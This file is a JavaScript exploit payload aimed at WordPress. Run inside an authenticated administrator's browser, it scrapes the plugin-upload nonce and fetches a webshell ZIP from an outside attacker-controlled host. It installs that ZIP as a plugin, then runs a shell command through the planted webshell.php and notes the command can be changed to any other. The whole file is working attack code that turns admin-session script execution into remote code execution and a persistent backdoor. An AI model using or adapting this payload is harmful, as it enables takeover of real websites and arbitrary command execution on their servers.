(async () => {
  'use strict';

  const result = {};

  const attackerOrigin = 'https://poc.jackfromeast.site';

  try {
    const uploadPage = await fetch('/wp-admin/plugin-install.php?tab=upload', {
      credentials: 'same-origin',
      cache: 'no-store'
    });
    const uploadHtml = await uploadPage.text();
    const nonceMatch = uploadHtml.match(/name=["']_wpnonce["']\s+value=["']([^"']+)["']/);
    if (!uploadPage.ok || !nonceMatch) {
      throw new Error('The authenticated plugin-upload form or nonce was not available (HTTP ' + uploadPage.status + ').');
    }

    const zipResponse = await fetch(attackerOrigin + '/exp/webshell.zip', { cache: 'no-store' });
    if (!zipResponse.ok) {
      throw new Error('Could not load the fixed local proof ZIP (HTTP ' + zipResponse.status + ').');
    }

    const form = new FormData();
    form.append('_wpnonce', nonceMatch[1]);
    form.append('pluginzip', await zipResponse.blob(), 'webshell.zip');
    form.append('install-plugin-submit', 'Install Now');

    const uploadResponse = await fetch('/wp-admin/update.php?action=upload-plugin', {
      method: 'POST',
      credentials: 'same-origin',
      body: form
    });
    const uploadResult = await uploadResponse.text();
    if (!uploadResponse.ok || !/Plugin installed successfully/i.test(uploadResult)) {
      throw new Error('Plugin upload did not report success (HTTP ' + uploadResponse.status + ').');
    }
    result.uploadPerformed = true;

    const cmd = 'id'; // change to any command
    const proofResponse = await fetch('/wp-content/plugins/webshell/webshell.php?cmd=' + encodeURIComponent(cmd), {
      credentials: 'same-origin',
      cache: 'no-store'
    });
    if (!proofResponse.ok) {
      throw new Error('Failed to execute command (HTTP ' + proofResponse.status + ').');
    }
    const proof = await proofResponse.json();
    if (typeof proof.command !== 'string' || typeof proof.output !== 'string') {
      throw new Error('The plugin returned an unexpected response structure.');
    }
    Object.assign(result, { command: proof.command, output: proof.output });

    console.log(result);

  } catch (error) {
    result.error = error.message;
    console.error(result);
  }
})();
